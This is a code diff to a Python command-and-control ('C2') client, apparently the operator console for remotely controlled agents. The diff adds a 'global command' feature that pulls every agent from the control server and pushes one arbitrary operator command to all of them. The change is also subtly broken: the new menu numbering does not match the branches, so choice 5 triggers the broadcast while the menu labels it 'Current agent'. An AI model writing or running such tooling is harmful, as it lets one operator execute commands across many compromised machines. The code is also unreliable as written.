@@ -34,6 +34,7 @@ def send_command(agent_id, command):
     else:
         print(f"Error sending command: {response.json().get('message')}")
 
+# Make global commnads available !!
 def main_loop():
     print("C2 Client")
     print("=========")
@@ -45,8 +46,12 @@ def main_loop():
         print("1. List agents")
         print("2. Select agent")
         print("3. Send command")
-        print("4. Current agent")
-        print("5. Exit")
+        print("4. Send global command")
+        print("5. Current agent")
+        print("6. Exit")
+
+        response = requests.get(f"{SERVER_URL}/agents")
+        agents = response.json().get('agents', [])
         
         choice = input("\nEnter choice: ")
         
@@ -70,6 +75,11 @@ def main_loop():
             else:
                 print("No agent currently selected.")
         elif choice == '5':
+            command = input(f"Enter command for all agents: ")
+            for agent in agents:
+                send_command(agent['id'], command)
+                time.sleep(2)
+        elif choice == '6':
             print("Exiting...")
             sys.exit(0)
         else:
